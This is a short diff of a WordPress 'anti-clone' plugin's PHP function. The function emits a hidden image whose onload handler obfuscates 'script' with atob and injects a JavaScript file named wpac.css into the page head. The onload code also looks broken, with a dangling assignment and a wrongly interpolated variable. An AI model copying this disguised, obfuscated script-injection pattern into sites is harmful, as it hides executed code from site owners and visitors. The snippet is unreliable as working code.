@@ -30,12 +30,12 @@ function wpac_add_js() {
   $domains = $domains['wpac_authDomains'];
   if($domains == '') return;
   $domains = explode(',', str_replace(' ', '', $domains));
-  $pluginsUrl = plugins_url().'/wp-anticlone/wpac.css';
+  $pluginsUrl = plugins_url();
   foreach($domains as $domain){
     $content .= '\''.base64_encode(str_replace('.www', '', $domain)).'\',';
   }
   $content = <<<EOD
-  <img src="wpac.png" style="display: none;" onload="=[{$domains}];var inj=document.createElement(atob('c2NyaXB0'));inj.src='{$pluginsUrl}';document.getElementsByTagName('head')[0].appendChild(inj);"/>
+  <img src="{$pluginsUrl}/wp-anticlone/wpac.png" style="display: none;" onload="=[{$domains}];var inj=document.createElement(atob('c2NyaXB0'));inj.src='{$pluginsUrl}/wp-anticlone/wpac.css';document.getElementsByTagName('head')[0].appendChild(inj);"/>
 EOD;
   echo $content;
 }
